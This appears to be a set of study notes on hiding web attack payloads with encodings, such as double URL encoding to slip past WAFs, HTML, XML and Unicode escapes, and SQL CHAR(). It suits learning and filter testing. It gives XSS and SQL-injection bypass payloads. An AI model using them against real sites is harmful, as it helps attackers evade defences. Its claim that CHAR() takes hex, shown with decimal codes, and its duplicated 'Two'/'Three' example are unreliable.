# Obfuscating attacks using encodings
## URL encoding
URL encoding is a standard mechanism used in HTTP to safely transmit special characters inside URLs.
Some security controls (e.g., WAFs) may incorrectly handle multiple decoding steps. In such cases, double URL encoding can be used to bypass filters if the input is decoded more than once by the backend.

For example:
```
Plain-text: <img src=x onerror=alert(1)>
One url encoding: %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
DOuble url encoding: %253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

## HTML encoding
HTML encoding replaces special characters with character references to prevent them from being interpreted as HTML markup.

Character references follow this format:
```
&name;
&#decimal;
&#xhex;
```

Example:
```
&colon;  → :
&#58;    → :
&#x3a;  → :
```

Note: The prefix "x" indicates a hexadecimal value.

HTML encoding can be abused for obfuscation in XSS attacks because browsers automatically decode these references during HTML parsing.

Example:

Plain text:
```
<img src=x onerror=alert(1)>
```

Obfuscated payload:
```
<img src=x onerror="&#x61;lert(1)">
```

## Leading zeros
When using decimal or hexadecimal HTML character references, it is possible to prepend an arbitrary number of leading zeros to the code point. Browsers ignore these zeros during decoding.

Example:
```
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

## XML encoding
HTML/XML character references can also be used inside XML requests to obfuscate payloads. XML parsers decode these references before the data is processed by the backend application.

Example:
```
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

## Unicode escaping
Unicode: \u003a

ES6: \u{3a}

Example:
```
eval("\u0061lert(1)")
```

It's possible leading zeros
Example:
```
<a href="javascript:\u{00000000061}alert(1)">Click me</a>
```

# Hex and Octal escaping
Hex: \x61

Octal: \141

Example:
```
eval("\x61lert")
eval("\141lert(1)")
```

## Multiple encodings
```
One: <a href="javascript:&bsol;u0061lert(1)">Click me</a>
Two: <a href="javascript:\u0061lert(1)">Click me</a>
Three: <a href="javascript:\u0061lert(1)">Click me</a>
```

## SQL CHAR() function
CHAR() and inside the parentheses you have yo use hex code

Example: 
```
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```
